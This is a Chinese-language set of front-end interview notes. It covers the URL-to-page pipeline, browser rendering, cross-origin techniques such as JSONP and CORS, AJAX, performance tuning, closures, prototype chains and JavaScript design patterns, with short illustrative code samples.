## interview question

### 从输入url到输出页面, 经历了哪些过程

**[从输入 URL 到页面加载完成的过程中都发生了什么事情][ulr-happen]**

#### 1. 从输入 URL 到浏览器接收的过程中发生了什么事情？

1. 从触屏/键盘到 CPU
2. CPU 内部的处理
3. 从 CPU 到操作系统内核
4. 从操作系统 GUI 到浏览器

#### 2. 浏览器如何向网卡发送数据？

1. 从浏览器到浏览器内核 
  * TCP 链接甚至渲染
  * 回车 URL 进行检查, 首先判断协议, 如果是 http 就按照 Web 来处理, 进行安全检查, 然后直接调用浏览器内核中的对应方法, 比如 WebView 中的 loadUrl 方法
  * 浏览器指的是 Chrome、Firefox，而浏览器内核则是 Blink、Gecko，浏览器内核只负责渲染，GUI 及网络连接等跨平台工作则是浏览器实现的
2. HTTP 请求的发送
3. DNS 查询 (dig +trace test.yhtml5.com)
  * 本机所设置的 DNS 服务器(8.8.8.8)向 DNS 根节点查询负责 .com 区域的域务器
  * 通过其中一个负责 .com 的服务器查询负责 baidu.com 的服务器
  * 最后由其中一个 baidu.com 的域名服务器查询 fex.baidu.com 域名的地址
4. 通过 Socket 发送数据
  * HTTP 常用的是 TCP 协议 (TCP 协议需要保证顺序)
  * HTTP 请求是纯文本格式的，所以在 TCP 的数据段中可以直接分析 HTTP 的文本

#### 3. 数据如何从本机网卡发送到服务器？

1. 从内核到网络适配器(Network Interface Card)
2. 连接 Wi-Fi 路由 / 移动蜂窝网络
3. OSI 七层网络结构 
4. 运营商网络内的路由-主干网间的传输-IDC 内网
5. 服务器 CPU 

#### 4. 服务器接收到数据后会进行哪些处理？

1. 负载均衡
2. 反向代理
  * 根据请求的域名不同, 将请求转发到内部的其它端口
  * 进行很多统一处理，比如防攻击策略、防抓取、SSL、gzip、自动性能优化等
  * 应用层的分流策略都能在这里做，比如对 /xx 路径的请求分到 a 服务器，对 /yy 路径的请求分到 b 服务器，或者按照 cookie 进行小流量测试等
  * 缓存，并在后端服务挂掉的时候显示友好的 404 页面
  * 监控后端服务是否异常
3. Web Server 中的处理 (Node.JS)
4. node js, 监听端口, 根据参数不同, 查询数据库, 处理业务逻辑, 缓存, 返回操作结果

#### 5. 服务器返回数据后浏览器如何处理？

1. gzip 解压
2. 外链资源的加载
3. JavaScript 的执行
4. 从字符到图片

#### 6. 浏览器如何将页面展现出来？

1. Framebuffer
2. 从内存到 LCD
3. LCD 显示

### 浏览器如何工作

**[how browsers work][how-browsers-work]**

#### 浏览器的高层结构

1. 用户界面 - 包括地址栏、前进/后退按钮、书签菜单等。除了浏览器主窗口显示的您请求的页面外，其他显示的各个部分都属于用户界面。
2. 浏览器引擎 - 在用户界面和呈现引擎之间传送指令。
3. 渲染引擎 - 负责显示请求的内容。如果请求的内容是 HTML，它就负责解析 HTML 和 CSS 内容，并将解析后的内容显示在屏幕上。
4. 网络 - 用于网络调用，比如 HTTP 请求。其接口与平台无关，并为所有平台提供底层实现。
5. 用户界面后端 - 用于绘制基本的窗口小部件，比如组合框和窗口。其公开了与平台无关的通用接口，而在底层使用操作系统的用户界面方法。
6. JavaScript 解释器。用于解析和执行 JavaScript 代码。
7. 数据存储。这是持久层。浏览器需要在硬盘上保存各种数据，例如 Cookie。新的 HTML 规范 (HTML5) 定义了“网络数据库”，这是一个完整（但是轻便）的浏览器内数据库。

#### 渲染引擎

Firefox,Chrome,Safari 等浏览器都基于两种呈现引擎构建的。Firefox 使用的是 Gecko，这是 Mozilla 公司“自制”的呈现引擎。而 Safari 和 Chrome 浏览器使用的都是 WebKit。

WebKit 是一种开放源代码呈现引擎，起初用于 Linux 平台，随后由 Apple 公司进行修改，从而支持苹果机和 Windows。有关详情，请参阅 webkit.org

##### 主流程

* **渲染**引擎从**网络层**获取请求文档的内容
* 渲染引擎将开始**解析** HTML 文档，并将各标记逐个转化成**“内容树”上的DOM 节点**。同时也会解析外部 CSS 文件以及样式元素中的样式数据。HTML 中这些带有视觉指令的样式信息将用于创建另一个树结构：**呈现树**。
* 呈现树包含多个带有视觉属性（如颜色和尺寸）的矩形。这些矩形的排列顺序就是它们将在屏幕上显示的顺序。
* 呈现树构建完毕之后，进入**“布局/重排”**处理阶段，也就是为每个节点分配一个应出现在屏幕上的确切坐标。
* 下一个阶段是绘制 - 呈现引擎会**遍历呈现树**，由用户界面后端层将每个节点绘制出来。
* 需要着重指出的是，这是一个**渐进的过程**。为达到更好的用户体验，呈现引擎会力求尽快将内容显示在屏幕上。它不必等到整个 HTML 文档解析完毕之后，就会开始构建呈现树和设置布局。在不断接收和处理来自网络的其余内容的同时，呈现引擎会将部分内容解析并显示出来。 

##### html解析

解析文档是指将文档转化成为有意义的结构，也就是可让代码理解和使用的结构。解析得到的结果通常是代表了文档结构的节点树，它称作解析树或者语法树

* 解析的过程可以分成两个子过程：词法分析和语法分析
* 词法分析是将输入内容分割成大量标记的过程
* 语法分析是应用语言的语法规则的过程
* HTML 解析器的任务是将 HTML 标记解析成解析树

##### DOM

* 解析器的输出“解析树”是由**DOM 元素**和**属性节点**构成的树结构。
* DOM 是文档对象模型 (Document Object Model) 的缩写。
* 它是 HTML 文档的对象表示，同时也是外部内容（例如 JavaScript 与 HTML 元素之间的**接口**。
* 解析树的根节点是“Document”对象。
* DOM 与标记之间几乎是一一对应的关系。
* HTML5 规范详细地描述了解析算法; 此算法由两个阶段组成：标记化和树构建
* 标记化算法, 树构建算法
* 浏览器的容错机制

##### CSS 解析

* 词法语法（词汇）是针对各个标记用正则表达式定义的

##### 处理脚本和样式表的顺序

**脚本**

网络的模型是同步的。网页作者希望解析器遇到 `<script>` 标记时立即解析并执行脚本。文档的解析将停止，直到脚本执行完毕。

如果脚本是外部的，那么解析过程会停止，直到从网络同步抓取资源完成后再继续。
此模型已经使用了多年，也在 HTML4 和 HTML5 规范中进行了指定。

作者也可以将脚本标注为“defer”，这样它就不会停止文档解析，而是等到解析结束才执行。
HTML5 增加了一个选项，可将脚本标记为异步，以便由其他线程解析和执行。 

**预解析**

**样式表**

##### 呈现树构建


### 跨域问题及其解决方式

**[同源策略与JS跨域][cross-domain]**

浏览器同源策略: 同域名,同端口,同协议
> 协议或者端口的不同，只能通过后台来解决

#### 同源策略的限制
1. Cookie、LocalStorage和IndexDB无法读取。
2. DOM无法获得。
3. AJAX请求不能发送。

#### 如何跨域
* document.domain 
 1. 两个域只是子域不同
 2. 只适用于iframe窗口与父窗口之间互相获取cookie和DOM节点，不能突破LocalStorage和IndexDB的限制。
* window.name
 1. window.name容量很大，可以放置非常长的字符串
 2. 必须监听子窗口window.name属性的变化，影响网页性能
* window.postMessage

#### ajax/fetch跨域

##### jsonp

先在网页上添加一个script标签，设置这个script标签的src属性用于向服务器请求JSON数据，
需要注意的是，src属性的查询字符串一定要加一个callback函数，用来指定回调函数的名字 。

而这个函数是在资源加载之前就已经在前端定义好的，这个函数接受一个参数并利用这个参数做一些事情。
向服务器请求后，服务器会将JSON数据放在一个指定名字的回调函数里作为其参数传回来。
这时，因为函数已经在前端定义好了，所以会直接调用。

**特点:**
 1. 可以是两个完全不同源的域
 2. 只支持HTTP请求中的GET方式
 3. 老式浏览器全部支持
 4. 需要服务端支持
 5. 前后端强制耦合, 协作上多了一层沟通
 6. 判断请求成功失败比较棘手, 可以设置响应时间

**例子:**
```
function addScriptTag(src) {
    var script = document.createElement('script')
    script.setAttribute("type","text/javascript")
    script.src = src
    document.body.appendChild(script)
}

window.onload = function () {
    addScriptTag('http://example.com/ip?callback=foo');//请求服务器数据并规定回调函数为foo
}

function foo(data) {
    console.log('Your public IP address is: ' + data.ip)
}

foo({
    "ip": "8.8.8.8"
});
```

##### 网络代理
可以在服务器端设置一个代理，由服务器端向跨域下的网站发出请求，再将请求结果返回给前端

```
$(document).ready(function(){
    $.getJSON("http://query.yahooapis.com/v1/public/yql?callback=?", { //yahoo提供的jsonp代理  
    q: "select * from json where url='www.cainiu.com/adminstock/appVersion/158/appVersions?page=1&rows=20'" ,
    format: "json" 
        }, function(data) {   
            if (data.query.results) {  
                var result = JSON.stringify(data.query.results); 
                var obj = eval('('+result+')'); 
                var rowsLen = obj.json.rows.length;
                
                for (var i=0; i < rowsLen; i++) {
                    var version=obj.json.rows[i].appDesc
                    var appDesc=obj.json.rows[i].appDesc.split('\r\n')
                    for(j=0;j<appDesc.length;j++){
                        $(".ol"+i).append("<li>"+appDesc[j]+"</li>")
                    }
                   $(".appVersion"+i).html("<h2>"+obj.json.rows[i].createDate.substring(0,10)+"</h2>"+"<br>"+"版本号："+obj.json.rows[i].appVersion)
                   //class循环                                                         访问json行里的变量，截取字符串长度  
                  }} else {   
                alert("未能获取到信息请稍候再试！");//或者写你的其他逻辑，比如重新加载啥的。
            }   
        });   
  });
```

##### 通过CORS跨域 (Cross-Origin Resource Sharing)

CORS (跨域资源共享)是一个系统, 包括传输的 HTTP headers, 
其确定是否阻止或完成从该资源所在的域外的另一个域的网页上的受限资源的请求

同源安全策略( same-origin security policy)默认禁止“跨域”请求. 
CORS 给予Web服务器跨域访问控制, 启用安全的跨域数据传输

浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）

1. 请求方法是以下三种方法之一: HEAD/GET/POST
2. HTTP的头信息不超出以下几种字段：
  * Accept
  * Acept-Language
  * Content-Language
  * Last-Event-ID
  * Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain
3. 预检请求, option请求

```
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: FooBar
```


**特点:**
1. 可以是两个完全不同源的域
2. 支持所有类型的HTTP请求
3. 被绝大多数现代浏览器支持，老式浏览器不支持
4. 需要服务端支持

**note**
1. 注意过滤option请求

##### web sockets

##### 反向代理

可以在 反向代理服务器nginx 或 由nginx转发到内网服务器中处理(nodejs)

**特点:**
1. 告诉浏览器, 我是同源的
2. 向真正的api服务器请求数据, 并返回
3. 不需要改变目标源服务器配置
4. 不需要改变客户端的请求方式

总结: 

在有自己服务器做中间层情况下使用反向代理/CORS(跨域资源共享)
在无权改变目标服务器, 又没有自己服务器做中间层, 使用jsonp/网络代理等方式

### AJAX


```
<script type="text/javascript" language="javascript">
    function makeRequest(url) {
        var httpRequest;

        if (window.XMLHttpRequest) { // Mozilla, Safari, ...
            httpRequest = new XMLHttpRequest();
            if (httpRequest.overrideMimeType) {
                httpRequest.overrideMimeType('text/xml');
            }
        }
        else if (window.ActiveXObject) { // IE
            try {
                httpRequest = new ActiveXObject("Msxml2.XMLHTTP");
            }
            catch (e) {
                try {
                    httpRequest = new ActiveXObject("Microsoft.XMLHTTP");
                }
                catch (e) {}
            }
        }

        if (!httpRequest) {
            alert('Giving up :( Cannot create an XMLHTTP instance');
            return false;
        }
        httpRequest.onreadystatechange = function() { alertContents(httpRequest); };
        httpRequest.open('GET', url, true);
        httpRequest.send('');

    }

    function alertContents(httpRequest) {

        if (httpRequest.readyState == 4) {
            if (httpRequest.status == 200) {
                alert(httpRequest.responseText);
            } else {
                alert('There was a problem with the request.');
            }
        }

    }
</script>
<span
    style="cursor: pointer; text-decoration: underline"
    onclick="makeRequest('test.html')">
        Make a request
</span>
```

### 前端性能优化相关问题

这是一个非常大的概念, 也是一个工程性问题

再谈优化之前我们先了解一下项目需求, 这是一个什么项目, 活动页? pc网站? 
然后进行技术选型 使用native, react, jquery等等组合

然后使用webpack等工具进行优化

优化的方向: 减少http请求/降低资源大小/缓存/代码规范

具体的优化措施有:

**构建工具webpack**
* 打包/压缩/合并/混淆  html/css/js 等资源
* 压缩jpg/png/gif图片资源, 使用雪碧图, 小图片合成大图片, 减少http请求
* 少用图片, 使用iconfont, svg
* 使用uglifyJs删除调试信息/未使用的函数/if(false)
* 打包策略: 按需打包/代码切割
* 加载策略: 异步加载/并线加载/预加载
* 缓存策略: 长久缓存公用代码/业务逻辑代码加上版本号,hash

**其它**
* 规范的客户端代码结构
* 减少dom操作,使用js(for循环/diff算法)
* 提取公共的资源,模块,函数,样式 / 内联样式
* 熟悉浏览器工作原理, 尤其是渲染引擎, 合理的加载资源顺序
* 使用localstorage本地储存

**服务器支持**
* 开启gzip, 二进制文本压缩率通常非常高, (jquery 89k -> 23k)
* 上cdn (Content Delivery Network) 
* 选择优良的域名提供商, 域名解析需要时间
* 服务端渲染, 服务端缓存静态文件到内存
* 服务器使用合适的 cpu/memory/ssd
* 单机集群, 负载均衡
* 规范的服务端代码结构

产品上测试环境时候, 使用专门的[网站性能检测工具][gtmetrix]进行测试, 看看需要哪里需要优化的, 

### 浏览器兼容性等问题

在项目开发之前, 我们要考虑中到产品的面向人群, 已经对应的兼容程度
然后选定最合适的开发框架或类库

* [html5shiv][html5shiv]  --创建新的HTML5标签,自动完成了设置 IE 浏览器和新语义元素的兼容性
* [normalize][normalize]  --清除各浏览器自带的标签样式规则, 消除样式差异
* 浏览器前缀  --现代浏览器,不同浏览器厂商, 使用构建工具自动添加 css浏览器前缀
* [es5-shim][es5-shim]  --为低版本浏览器, 添加es5规则
* [json2][json2]  --IE6 IE7 IE8 不支持 JSON 对象
* [Modernizr][modernizr]  --监测浏览器特性, 根据不同是否支持某个属性添加 相对于的css,js
* es6 使用babel转换成es5
* 提示用户更换浏览器  (天猫 >ie7)
* 开启服务端渲染, react/vue/模板嵌套

兼容措施只是辅助手段, 一切以产品功能开发, 正常上线优先

### 闭包/作用域

#### 作用域

没有块作用域：即作用域不是以{}包围的，其作用域完成由函数来决定，因而if /for等语句中的花括号不是独立的作用域

如前述，JS的在函数中定义的局部变量只对这个函数内部可见，称之谓函数作用域

* 嵌套作用域变量搜索规则：当在函数中引用一个变量时，JS会搜索当前函数作用域，如果没有找到则搜索其上层作用域，一直到全局作用域
* 词法作用域规则：函数的嵌套关系是定义时决定的，而非调用时决定的，即词法作用域，即嵌套关系是由词法分析时确定的，而非运行时决定
* 对于这两个规则的相互作用，函数内无论什么位置定义的局部变量，在进入函数时都是已经定义的，但未初始化，即为undefined，直到运行到变量被赋值时才被初始化，因此若访问了未初始化的变量，我们会得到undefined的说明
* 全局作用域的变量是全局对象的属性，不论在什么函数中都可以直接访问，而不需要通过全局对象，但加上全局对象，可以提供搜索效率。
* 满足下列条件的变量属于全局作用域：在最外层定义的变量/全局对象的属性/任何地方隐匿定义的变量。

#### 词法作用域

```
function init() {
  let name = "Mozilla"; 
  // name 是一个被init创建的局部变量
  function displayName() { 
  // displayName() 是一个内部函数,
      alert(name); 
      //  一个闭包使用在父函数中声明的变量
  } 
  displayName();
}
init();
```

在 JavaScript 中，变量的作用域是由它在源代码中所处位置决定的（显然如此），并且嵌套的函数可以访问到其外层作用域中声明的变量。

#### [闭包][closures]

闭包是一种特殊的对象。它由两部分构成：函数，以及创建该函数的环境
环境由闭包创建时在作用域中的任何局部变量组成

Closures (闭包)是使用被作用域封闭的变量，函数，闭包等执行的一个函数的作用域。
通常我们用和其相应的函数来指代这些作用域。(可以访问独立数据的函数)

闭包是指这样的作用域，它包含有一个函数，这个函数可以调用被这个作用域所**封闭**的变量、函数或者闭包等内容。通常我们通过闭包所对应的函数来获得对闭包的访问。

1. 闭包最常用的方式就是返回一个内联函数（何为内联函数？就是在函数内部声明的函数）；
2. 在JavaScript中有作用域和执行环境的问题，在函数内部的变量在函数外部是无法访问的，在函数内部却可以得到全局变量。由于种种原因，我们有时候需要得到函数内部的变量，可是用常规方法是得不到的，这时我们就可以创建一个闭包，用来在外部访问这个变量。
3. 闭包的用途 主要就是上一点提到的读取函数内部变量，还有一个作用就是可以使这些变量一直保存在内存中。
4. 使用闭包要注意，由于变量被保存在内存中，所以会对内存造成消耗，所以不能滥用闭包。解决方法是 在退出函数之前，将不使用的局部变量全部删除。


**demo1:**
myFunc 是一个闭包，由 displayName 函数和闭包创建时存在的 "Mozilla" 字符串形成。

```
function makeFunc() {
  var name = "Mozilla";
  function displayName() {
    alert(name);
  }
  return displayName;
}

var myFunc = makeFunc();
myFunc();
```

**demo2:**

从本质上讲，makeAdder 是一个函数工厂: 创建将指定的值和它的参数求和的函数，
在上面的示例中，我们使用函数工厂创建了两个新函数: 一个将其参数和 5 求和，另一个和 10 求和。

add5 和 add10 都是闭包。它们共享相同的函数定义，但是保存了不同的环境。
在 add5 的环境中，x 为 5。而在 add10 中，x 则为 10。

```
function makeAdder(x) {
  return function(y) {
    return x + y;
  };
}

var add5 = makeAdder(5);
var add10 = makeAdder(10);

console.log(add5(2));  // 7
console.log(add10(2)); // 12
```

**作用**
1. 闭包允许将函数与其所操作的某些数据（环境）关连起来; 大部分我们所写的 Web JavaScript 代码都是事件驱动的: 定义某种行为，然后将其添加到用户触发的事件之上（比如点击或者按键）
2. 模拟私有方法。私有方法不仅仅有利于限制对代码的访问,隐藏对象的私有函数和变量,还提供了管理全局命名空间的强大能力，避免非核心的方法弄乱了代码的公共接口部分。

```
var makeCounter = function() {
  var privateCounter = 0;
  function changeBy(val) {
    privateCounter += val;
  }
  return {
    increment: function() {
      changeBy(1);
    },
    decrement: function() {
      changeBy(-1);
    },
    value: function() {
      return privateCounter;
    }
  }  
};

var Counter1 = makeCounter();
var Counter2 = makeCounter();
console.log(Counter1.value()); /* logs 0 */
Counter1.increment();
Counter1.increment();
console.log(Counter1.value()); /* logs 2 */
Counter1.decrement();
console.log(Counter1.value()); /* logs 1 */
console.log(Counter2.value()); /* logs 0 */
```

**错误**
在 JavaScript 1.7 引入 let 关键字 之前，闭包的一个常见的问题发生于在循环中创建闭包

```
function showHelp(help) {
  document.getElementById('help').innerHTML = help;
}

function setupHelp() {
  var helpText = [
      {'id': 'email', 'help': 'Your e-mail address'},
      {'id': 'name', 'help': 'Your full name'},
      {'id': 'age', 'help': 'Your age (you must be over 16)'}
    ];

  for (var i = 0; i < helpText.length; i++) {
    var item = helpText[i];
    document.getElementById(item.id).onfocus = function() {
      showHelp(item.help);
    }
  }
}

setupHelp();
```

该问题的原因在于赋给 onfocus是闭包（setupHelp）中的匿名函数而不是闭包对象；在闭包（setupHelp）中一共创建了三个匿名函数，但是它们都共享同一个环境（item）。在 onfocus 的回调被执行时，循环早已经完成，且此时 item 变量（由所有三个闭包所共享）已经指向了 helpText 列表中的最后一项。

解决这个问题的一种方案是使onfocus指向一个新的闭包对象。

```
function showHelp(help) {
  document.getElementById('help').innerHTML = help;
}

function makeHelpCallback(help) {
  return function() {
    showHelp(help);
  };
}

function setupHelp() {
  var helpText = [
      {'id': 'email', 'help': 'Your e-mail address'},
      {'id': 'name', 'help': 'Your full name'},
      {'id': 'age', 'help': 'Your age (you must be over 16)'}
    ];

  for (var i = 0; i < helpText.length; i++) {
    var item = helpText[i];
    document.getElementById(item.id).onfocus = makeHelpCallback(item.help);
  }
}

setupHelp();
```

所有的回调不再共享同一个环境， makeHelpCallback 函数为每一个回调创建一个新的环境。在这些环境中，help 指向 helpText 数组中对应的字符串。

**性能考量**
```
function MyObject(name, message) {
  this.name = name.toString();
  this.message = message.toString();
  this.getName = function() {
    return this.name;
  };

  this.getMessage = function() {
    return this.message;
  };
}
```
上面的代码并未利用到闭包的益处，因此，应该修改为如下常规形式：
```
function MyObject(name, message) {
  this.name = name.toString();
  this.message = message.toString();
}
MyObject.prototype = {
  getName: function() {
    return this.name;
  },
  getMessage: function() {
    return this.message;
  }
};
```
```
function MyObject(name, message) {
  this.name = name.toString();
  this.message = message.toString();
}
MyObject.prototype.getName = function() {
  return this.name;
};
MyObject.prototype.getMessage = function() {
  return this.message;
};
```
```
function MyObject(name, message) {
    this.name = name.toString();
    this.message = message.toString();
}
(function() {
    this.getName = function() {
        return this.name;
    };
    this.getMessage = function() {
        return this.message;
    };
}).call(MyObject.prototype);
```
在前面的三个示例中，继承的原型可以为所有对象共享，且不必在每一次创建对象时定义方法


**循环与闭包**

```
for(var i=1; i<=5; i++){
    setTimeout(function timer(){
        console.log(i);
    }, i*1000);
}
// 期望：每秒一次的频率输出0~5
// 结果：每秒一次的频率输出五次6
```

```
for(var i=0; i<=5; i++){
    (function(j){
        setTimeout(function timer(){
            console.log(j);
        }, j*1000 );
    })(i);
}
// 结果：每秒一次的频率输出0~5
```

```
for(let i=0; i<=5; i++){
    setTimeout(function timer(){
        console.log(i);
    }, i*1000 );
}
// 结果：每秒一次的频率输出0~5
```


### 原型 prototype 

* 每个函数都有一个属性叫做原型，这个属性指向一个对象
* 原型只是函数的一个属性

也就是说，原型是函数对象的属性，不是所有对象的属性，对象经过构造函数new出来，那么这个new出来的对象的构造函数有一个属性叫原型。

每次你定义一个函数的时候，这个函数的原型属性也就被定义出来了，也就可以使用了，如果不对它进行显示赋值的话，那么它的初始值就是一个空的对象Object。

### 继承和原型链

JavaScript 是动态的，并且本身不提供类实现.(在ES2015/ES6中引入了class关键字，但是只是语法糖，JavaScript 仍然是基于原型的)。
当谈到继承时，Javascript 只有一种结构：对象。

每个对象都有一个内部链接到另一个对象，称为它的原型 prototype。该原型对象有自己的原型，等等，直到达到一个以null为原型的对象。
根据定义，null没有原型，并且作为这个原型链 prototype chain中的最终链接。

虽然，原型继承经常被视作 JavaScript 的一个弱点，但事实上，原型继承模型比经典的继承模型更强大。
举例来说，在原型继承模型的基础之上建立一个经典的继承模型是相当容易的。


#### 继承属性

JavaScript 对象是动态的属性“包”（指其自己的属性）。
JavaScript 对象有一个指向一个原型对象的链。

当试图访问一个对象的属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，
依此层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。

遵循ECMAScript标准，someObject.__proto__ 符号是用于指派 someObject 的原型。这个等同于 JavaScript 的 __proto__  属性。
从 ECMAScript 6 开始, __proto__ 可以用Object.getPrototypeOf()和Object.setPrototypeOf()访问器来访问。

```
// 让我们假设我们有一个对象 o, 其有自己的属性 a 和 b：
// {a: 1, b: 2}
// o 的原型 o.__proto__有属性 b 和 c：
// {b: 3, c: 4}
// 最后, o.__proto__.__proto__ 是 null.
// 这就是原型链的末尾，即 null，
// 根据定义，null 没有__proto__.
// 综上，整个原型链如下: 
// {a:1, b:2} ---> {b:3, c:4} ---> null

console.log(o.a); // 1
// a是o的自身属性吗？是的，该属性的值为1

console.log(o.b); // 2
// b是o的自身属性吗？是的，该属性的值为2
// o.__proto__上还有一个'b'属性,但是它不会被访问到.这种情况称为"属性遮蔽 (property shadowing)".

console.log(o.c); // 4
// c是o的自身属性吗？不是，那看看o.__proto__上有没有.
// c是o.__proto__的自身属性吗？是的,该属性的值为4

console.log(o.d); // undefined
// d是o的自身属性吗？不是,那看看o.__proto__上有没有.
// d是o.__proto__的自身属性吗？不是，那看看o.__proto__.__proto__上有没有.
// o.__proto__.__proto__为null，停止搜索，
// 没有d属性，返回undefined
```

创建一个对象它自己的属性的方法就是设置这个对象的属性。唯一例外的获取和设置的行为规则就是当有一个 getter或者一个setter 被设置成继承的属性的时候。

### 继承方法

JavaScript 并没有其他基于类的语言所定义的“方法”。
在 JavaScript 里，任何函数都可以添加到对象上作为对象的属性。
函数的继承与其他的属性继承没有差别，包括上面的“属性遮蔽”（这种情况相当于其他语言的方法重写）

当继承的函数被调用时，this 指向的是当前继承的对象，而不是继承的函数所在的原型对象。

```
var o = {
  a: 2,
  m: function(){
    return this.a + 1;
  }
};

console.log(o.m()); // 3
// 当调用 o.m 时,'this'指向了o.

var p = Object.create(o);
// p是一个对象, p.__proto__是o.

p.a = 12; // 创建 p 的自身属性a.
console.log(p.m()); // 13
// 调用 p.m 时, 'this'指向 p. 
// 又因为 p 继承 o 的 m 函数
// 此时的'this.a' 即 p.a，即 p 的自身属性 'a'
```

### 使用不同的方法来创建对象和生成原型链
#### 使用普通语法创建对象
```
var o = {a: 1};

// o这个对象继承了Object.prototype上面的所有属性
// 所以可以这样使用 o.hasOwnProperty('a').
// hasOwnProperty 是Object.prototype的自身属性。
// Object.prototype的原型为null。
// 原型链如下:
// o ---> Object.prototype ---> null

var a = ["yo", "whadup", "?"];

// 数组都继承于Array.prototype 
// (indexOf, forEach等方法都是从它继承而来).
// 原型链如下:
// a ---> Array.prototype ---> Object.prototype ---> null

function f(){
  return 2;
}

// 函数都继承于Function.prototype
// (call, bind等方法都是从它继承而来):
// f ---> Function.prototype ---> Object.prototype ---> null
```

#### 使用构造器创建对象

在 JavaScript 中，构造器其实就是一个普通的函数。当使用 new 操作符 来作用这个函数时，它就可以被称为构造方法（构造函数）。

```
function Graph() {
  this.vertices = [];
  this.edges = [];
}

Graph.prototype = {
  addVertex: function(v){
    this.vertices.push(v);
  }
};

var g = new Graph();
// g是生成的对象,他的自身属性有'vertices'和'edges'.
// 在g被实例化时,g.__proto__指向了Graph.prototype.
```

#### 使用 Object.create 创建对象

ECMAScript 5 中引入了一个新方法：Object.create()。可以调用这个方法来创建一个新对象。新对象的原型就是调用 create 方法时传入的第一个参数：
```
var a = {a: 1}; 
// a ---> Object.prototype ---> null

var b = Object.create(a);
// b ---> a ---> Object.prototype ---> null
console.log(b.a); // 1 (继承而来)

var c = Object.create(b);
// c ---> b ---> a ---> Object.prototype ---> null

var d = Object.create(null);
// d ---> null
console.log(d.hasOwnProperty); // undefined, 因为d没有继承Object.prototype
```

#### 使用 class 关键字
ECMAScript6 引入了一套新的关键字用来实现 class。使用基于类语言的开发人员会对这些结构感到熟悉，但它们是不一样的。 
JavaScript 仍然是基于原型的。这些新的关键字包括 class, constructor, static, extends, 和 super.

```
"use strict";

class Polygon {
  constructor(height, width) {
    this.height = height;
    this.width = width;
  }
}

class Square extends Polygon {
  constructor(sideLength) {
    super(sideLength, sideLength);
  }
  get area() {
    return this.height * this.width;
  }
  set sideLength(newLength) {
    this.height = newLength;
    this.width = newLength;
  }
}

var square = new Square(2);
```

#### prototype or `__proto__`

[js中__proto__和prototype的区别和关系][prototype]

那么`__proto__`是什么？每个对象都会在其内部初始化一个属性，就是`__proto__`，
当我们访问一个对象的属性 时，如果这个对象内部不存在这个属性，那么他就会去`__proto__`里找这个属性，这个`__proto__`又会有自己的`__proto__`，
于是就这样 一直找下去，也就是我们平时所说的原型链的概念。

* `prototype`显式原型, 函数在创建之后都会拥有一个名为prototype的属性，这个属性指向函数的原型对象
* `__proto__`隐式原型, 任意对象都有一个内置属性, 是不对外公开的, 是作为私有属性存在的, 具有遮蔽性
* 对象有属性__proto__,指向该对象的构造函数的原型对象。
* 方法除了有属性__proto__,还有属性prototype，prototype指向该方法的原型对象。

隐式原型指向创建这个对象的函数(constructor)的prototype

**作用**
* 显式原型的作用：用来实现基于原型的继承与属性的共享。
* 隐式原型的作用：构成原型链，同样用于实现基于原型的继承。举个例子，当我们访问obj这个对象中的x属性时，如果在obj中找不到，那么就会沿着__proto__依次查找。

#### 总结

在用原型继承编写复杂代码前理解原型继承模型十分重要。同时，还要清楚代码中原型链的长度，并在必要时结束原型链，以避免可能存在的性能问题。
此外，除非为了兼容新 JavaScript 特性，否则，永远不要扩展原生的对象原型。

### get/post区别

http 协议中, 这俩种请求方式没有本质上的区别

请求的内容都可以放在body/payload/param中
请求大小也没有限制

区别来自于浏览器/服务器, 以及resetful api 风格的影响

浏览器/服务器都有规定url 的长度限制, 
服务器处理请求也是需要消耗资源的, 一个几兆的url, 成千上万次的请求, 服务器肯定受不了

resetful api 规定 get 用于请求资源, post用于发送数据



### 页面间通信

无跨域情况下:

* Cookie/LocalStorage/sessionStorage/IndexDB

跨域情况下: 

* document.domain 
 1. 两个域只是子域不同
 2. 只适用于iframe窗口与父窗口之间互相获取cookie和DOM节点，不能突破LocalStorage和IndexDB的限制。
* window.name
 1. window.name容量很大，可以放置非常长的字符串
 2. 必须监听子窗口window.name属性的变化，影响网页性能
* window.postMessage

通用: 
* url 参数
* 服务器存入参数

### [js的设计模式][design-patterns]

JavaScript设计模式的作用 - 提高代码的重用性，可读性，使代码更容易的维护和扩展。

1. 单体模式，工厂模式，桥梁模式个人认为这个一个优秀前端必须掌握的模式，对抽象编程和接口编程都非常有好处。
2. 装饰者模式和组合模式有很多相似的地方，它们都与所包装的对象实现同样的接口并且会把任何方法的调用传递给这些对象。装饰者模式和组合模式是本人描述的较吃力的两个模式，我个人其实也没用过，所以查了很多相关资料和文档，请大家海涵。
3. 门面模式是个非常有意思的模式，几乎所有的JavaScript库都会用到这个模式，假如你有逆向思维或者逆向编程的经验，你会更容易理解这个模式（听起来有挑战，其实一接触你就知道这是个很简单的模式）；还有配置器模式得和门面模式一块拿来说，这个模式对现有接口进行包装，合理运用可以很多程度上提高开发效率。这两个模式有相似的地方，所以一块理解的话相信都会很快上手的。
4. 享元模式是一种以优化为目的的模式。
5. 代理模式主要用于控制对象的访问，包括推迟对其创建需要耗用大量计算资源的类得实例化。
6. 观察者模式用于对对象的状态进行观察，并且当它发生变化时能得到通知的方法。用于让对象对事件进行监听以便对其作出响应。观察者模式也被称为“订阅者模式”。
7. 命令模式是对方法调用进行封装的方式，用命名模式可以对方法调用进行参数化和传递，然后在需要的时候再加以执行。
8. 职责链模式用来消除请求的发送者和接收者之间的耦合。

#### 单体（Singleton）模式
**react组件**

单体在JavaScript的有多种用途，它用来划分命名空间。
可以减少网页中全局变量的数量(在网页中使用全局变量有风险)；可以在多人开发时避免代码的冲突(使用合理的命名空间)等等。

在中小型项目或者功能中，单体可以用作命名空间把自己的代码组织在一个全局变量名下；
在稍大或者复杂的功能中，单体可以用来把相关代码组织在一起以便日后好维护。　　
使用单体的方法就是用一个命名空间包含自己的所有代码的全局对象

#### 工厂（Factory）模式
**react-loader组件**

工厂就是把成员对象的创建工作转交给一个外部对象，好处在于消除对象之间的耦合(何为耦合？就是相互影响)。
通过使用工厂方法而不是new关键字及具体类，可以把所有实例化的代码都集中在一个位置，有助于创建模块化的代码，这才是工厂模式的目的和优势。

#### 桥接（bridge）模式
**routerChange - dispatch(init())**

